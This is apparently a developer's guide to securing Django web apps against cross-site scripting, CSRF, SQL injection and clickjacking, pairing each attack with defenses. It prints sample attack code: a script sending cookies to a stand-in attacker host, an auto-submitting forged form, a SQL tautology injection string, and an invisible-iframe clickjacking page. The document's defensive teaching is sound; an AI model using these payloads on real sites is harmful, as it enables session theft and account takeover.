- We will be mostly talking about web security in this doc and specifically how can django be strong armed against all kind of attacks. 
- So it is preferable that the reader first goes through this [doc](https://docs.djangoproject.com/en/3.0/topics/security/).



## Cross site scripting

- __How does it work?__

  - An attacker somehow manages to inject a JavaScript into the web-page which is considered as a source code by browser and if user click on such element the JavaScript injected by attacker can perform dangerous actions with it.

- __What can attacker do if he able to pull off the injecting part?__

  - Malicious JavaScript has access to all the objects that the rest of the web page has access to. This includes access to the user’s cookies. Cookies are often used to store session tokens. If an attacker can obtain a user’s session cookie, they can impersonate that user, perform actions on behalf of the user, and gain access to the user’s sensitive data.
  - JavaScript can use the `XMLHttpRequest` object to send HTTP requests with arbitrary content to arbitrary destinations.
  - JavaScript in modern browsers can use HTML-5 API. For example, it can gain access to the user’s Geo-location, webcam, microphone, and even specific files from the user’s file system. Most of these APIs require user opt-in, but the attacker can use social engineering to go around that limitation.

- __Here is an example of how this attack works:__

  - Let's say we have a code in our web-page which looks like this:

    

    ```python
    webpage_response = f"""<html>
    <head>
    <title>comments/my_post</title>
    </head>
    <body>
    <h1>My Post latest comments</h1>
    <span>{{ database.latest_comments }}</span>
    </body>
    </html>"""
    return render(webpage_response)
    ```

    

  - Now if some attacker adds a comment to post which is:

    ```javascript
    <script>
    window.location="http://attacker.domain/?cookie=" + document.cookie
    </script>
    ```

    

  - When this web-page will be rendered by any of the website user this script is executed and the information that is stored as cookies will be sent to the attackers website.

  - Keep in mind that lot site keep client secrets in cookies.

  - More info can be found [here](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).

- __How to save ourselves?__

  - Django templates [escape specific characters](https://docs.djangoproject.com/en/3.0/ref/templates/language/#automatic-html-escaping) which are particularly dangerous to HTML. While this protects users from most malicious input, it is not entirely foolproof. For example, it will not protect the following:

    ```css
    <style class={{ var }}>...</style>
    ```

  - If `var` is set to `'class1 onmouseover=javascript:func()'`, this can result in unauthorized JavaScript execution, depending on how the browser renders imperfect HTML. (Quoting the attribute value would fix this case.)

  - It is also important to be particularly careful when using `is_safe` with custom template tags, the [`safe`](https://docs.djangoproject.com/en/3.0/ref/templates/builtins/#std:templatefilter-safe) template tag, [`mark_safe`](https://docs.djangoproject.com/en/3.0/ref/utils/#module-django.utils.safestring), and when autoescape is turned off.

  - Most of the time the protection towards this kind of attacks is escaping the dangerous characters or syntax when anything in web-page is dynamic.





# CSRF Attack

- __How does it work?__

  - The attacker causes the victim user to carry out an action unintentionally.

  - For example, suppose an application contains a function that lets the user change the email address on their account. When a user performs this action, they make an HTTP request like the following:

    ```http
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 30
    Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
    
    email=wiener@normal-user.com
    ```

  - Now attacker will create an HTML page somewhat like this:

    ```html
    <html>
      <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
          <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
          document.forms[0].submit();
        </script>
      </body>
    </html>
    ```

  - The attacker's page will trigger an HTTP request to the vulnerable web site.

  - If the user is logged in to the vulnerable web site, their browser will automatically include their session cookie in the request (assuming [SameSite cookies](https://portswigger.net/web-security/csrf/samesite-cookies) are not being used).

  - The vulnerable web site will process the request in the normal way, treat it as having been made by the victim user, and change their email address.

- __What can attacker do?__

  - In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

- __How to save ourselves?__

  - The most robust way to defend against CSRF attacks is to include a [CSRF token](https://portswigger.net/web-security/csrf/tokens) within relevant requests.
  - The token should be:
    - Unpredictable with high entropy, as for session tokens in general.
    - Tied to the user's session.
    - Strictly validated in __every case__ before the relevant action is executed.



# SQL injection

- __How does it work?__

  - SQL injection is a type of attack where a malicious user is able to execute arbitrary SQL code on a database. This can result in records being deleted or data leakage.

  - Let's say we have a query like this in our code to get data:

    ```sql
    select * from sensitive_data where username = '@username' and password = '@password'
    ```

  - Here, `@username` and `@password` is provided by user.

  - An attacker could pass it like this:

    `@username = 1' or '1`

    `@password = 1' or '1`

    If this is replaced in the query we get:

    ```sql
    select * from sensitive_data where username = '1' or '1' and password = '1' or '1'
    ```

  - This query will result in exploiting data of all the users that we have.

- __What can attacker do?__

  - Basically anything that he wants to do with the database.

- __How to save ourselves?__

  - Avoid using  raw sql queries in django.
  - Django ORM is already protected from this.
  - Use prepared statement instead of normal queries when there is no other option.
  - Escape sql characters like `"`,  `'`,  `or`,  etc.
  - Read [this](https://realpython.com/prevent-python-sql-injection/).

## Clickjacking

- __How does it work?__

  - Clickjacking is a type of attack where a malicious site wraps another site in a frame. This attack can result in an unsuspecting user being tricked into performing unintended actions on the target site.

  - Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

  - A web user accesses a decoy website (perhaps this is a link provided by an email) and clicks on a button to win a prize. Unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this results in the payment of an account on another site. This is an example of a clickjacking attack. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an iframe.

  - Let's see how can we create this kind of attack:

    ```html
    <html>
        <head>
              <style>
                    #target_website {
                          position:relative;
                          width:128px;
                          height:128px;
                          opacity:0.00001;
                          z-index:2;
                      }
                    #decoy_website {
                          position:absolute;
                          width:300px;
                          height:400px;
                          z-index:1;
                      }
              </style>
        </head>
        ...
        <body>
              <div id="decoy_website">
                  ...decoy web content here...
              </div>
                  <iframe id="target_website" src="https://vulnerable-website.com">
              </iframe>
        </body>
    </html>
    ```

- __What can attacker do?__

  - The victim may be fooled into clicking some button that performs sensitive action which attacker wants the victim to do e.g. a bank transfer

- __How to save ourselves?__

  - Django contains [clickjacking protection](https://docs.djangoproject.com/en/3.0/ref/clickjacking/#clickjacking-prevention) in the form of the [`X-Frame-Options middleware`](https://docs.djangoproject.com/en/3.0/ref/middleware/#django.middleware.clickjacking.XFrameOptionsMiddleware) which in a supporting browser can prevent a site from being rendered inside a frame.
  - The middleware is strongly recommended for any site that does not need to have its pages wrapped in a frame by third party sites, or only needs to allow that for a small section of the site.



# Foot notes

- There are several other things that we need to keep in mind in production.
- You can read more about it from the official doc.
  - [SSL/HTTPS](https://docs.djangoproject.com/en/3.0/topics/security/#ssl-https)
  - [Host header validation](https://docs.djangoproject.com/en/3.0/topics/security/#host-header-validation)
  - [Referrer policy](https://docs.djangoproject.com/en/3.0/topics/security/#referrer-policy)
  - [Session security](https://docs.djangoproject.com/en/3.0/topics/security/#session-security)
  - [And other things](https://docs.djangoproject.com/en/3.0/topics/security/#additional-security-topics)

